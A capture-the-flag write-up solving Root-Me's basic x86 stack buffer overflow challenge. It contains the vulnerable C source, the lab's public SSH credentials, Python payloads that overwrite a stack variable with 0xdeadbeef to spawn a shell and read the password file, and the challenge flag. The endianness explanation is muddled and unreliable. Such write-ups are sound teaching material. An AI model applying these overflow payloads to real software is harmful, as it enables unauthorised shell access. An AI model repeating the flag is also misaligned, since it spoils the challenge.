## Challenge name: ELF x86 - Stack buffer overflow basic 1


<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/04895213-1eda-41e5-b4ab-b2d5693caf9d" />
<br>
<br>

``` Challenge Link:```  **https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1**
<br>
<br>

**Statement - Environment configuration:**

```
+------------------+-----------------------------------------------+
| Protection       | Description                                   |
+------------------+-----------------------------------------------+
| PIE              | Position Independent Executable               |
| RelRO            | Read Only relocations                         |
| NX               | Non-Executable Stack                          |
| Heap exec        | Non-Executable Heap                           |
| ASLR             | Address Space Layout Randomization            |
| SF               | Source Fortification                          |
| SRC              | Source code access                            |
+------------------+-----------------------------------------------+
```

<br>

**Source Code Given:**
```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

<br>

**Challenge connection informations:**

```
+------------------+-------------------------------------------------------------+
| Field            | Value                                                       |
+------------------+-------------------------------------------------------------+
| Host             | challenge02.root-me.org                                     |
| Protocol         | SSH                                                         |
| Port             | 2222                                                        |
| SSH access       | ssh -p 2222 app-systeme-ch13@challenge02.root-me.org        |
| Username         | app-systeme-ch13                                            |
| Password         | app-systeme-ch13                                            |
+------------------+-------------------------------------------------------------+
```

**Now we will connect to lab via ssh uisng the the creds from challenge connection information.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/e916b73e-246f-472e-b2bd-901360874b1c" />
<br>
<br>

**After connecting we can see that there is our binary and as you can see there is .passwd and with that binary we can cat it so lets begin.**

<br>
<img width="1318" height="336" alt="image" src="https://github.com/user-attachments/assets/dba806a2-70dd-46e2-90b9-6cb4878af9f0" />
<br>
<br>

**In the code buffer defined to take user input was `char buf[40];` but input is read using `fgets(buf, 45, stdin)` which can read up to 44 bytes plus a null terminator. If more than 40 bytes are read, memory past `buf` will be overwritten and this allows us to overwrite adjacent stack variables.**

<br>
<img width="1318" height="450" alt="image" src="https://github.com/user-attachments/assets/af7ae160-3edb-47c5-b641-27567065b458" />
<br>
<br>

**As we know we can provide 40 bytes of junk and pass that first if conditional check and now to reach inside the second if condition which holds main stuff in this challenge we need to make the value of check equal to 0xdeadbeef. On x86 (little-endian), if you put a value like 0x04030201 in a variable, it is stored in the stack as `01 02 03 04`, which means 4321 but in big‑endian(older one not x86) 0x04030201 is stored as `04 03 02 01` in stack which simply means 4321. Little‑endian just changes how bytes are placed in memory/stack, not the actual value. Similarly, to set check = 0xdeadbeef, we need to write it in little‑endian order as `ef be ad de`. This does not mean anything in ASCII or OS‑wise like 0x04030201 means 1234, it is just raw hex bytes in a variable and we need to overwrite the variable in memory to go through that check/if cond. So our next payload will be 40 bytes of padding + these 4 bytes of `ef be ad de` overwrite check.**
<br><br>
**You may have a question like how do I know that after 40 bytes, the next 4 bytes overwrites check without showing memory layout, debugging, or offsets?** <br>
**-> And the answer is I don't know I am relying on compiler behavior + C stack layout conventions on x86. eg:** <br>

```
// Stack frame layout
int var;
int check = 0x04030201;
char buf[40];

// On x86, compiler - no weird flags, locals are typically laid out like this:
higher addresses
-----------------
saved EIP
saved EBP
var        (4 bytes)
check      (4 bytes)
buf[40]    // Our input goes here..
-----------------
lower addresses
```
<br><br>
**- The stack grows downward (higher addr -> lower addr)** <br>
**- Writing past the end of `buf` overwrites memory in ascending order (lower addr -> higher addr)** <br>
<br><br>
**That’s acceptable for an intro challenge, but it’s not rigorous exploitation methodology and you have option to check opening stack..**
<br><br>
**Lets use python for simplicity to make 40 bytes of padding for first if + 4 bytes of `ef be ad de` for second if to pass:**
<br><br>
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde');" | ./ch13
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/c7e0ce55-2631-462f-971e-32ce047e0d42" />
<br>
<br>

**It said you win and opened the shell runned bash for a sec and closed so when bash is running we have to provide args to bash to view our .passwd file to get flag. Using Payload:** <br><br>
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\xef\xbe\xad\xde'); sys.stdout.buffer.flush(); import time; time.sleep(0.2); sys.stdout.write('\ncat .passwd\n'); sys.stdout.flush(); time.sleep(1)" | ./ch13

//example given:
0x04030201  →  01 02 03 04 in memory // check is currently this 0x04030201
0xdeadbeef  →  ef be ad de in memory // we are making 0xdeadbeef to enter if statement..
```

<br>
<img width="1333" height="390" alt="image" src="https://github.com/user-attachments/assets/a874d8d8-d493-41a4-8e29-c605b021b751" />
<br>
<br>

**We can use this "1w4ntm043pr0np1s" as flag/passwd to validate the challenge..** <br>
**Thankyou.**






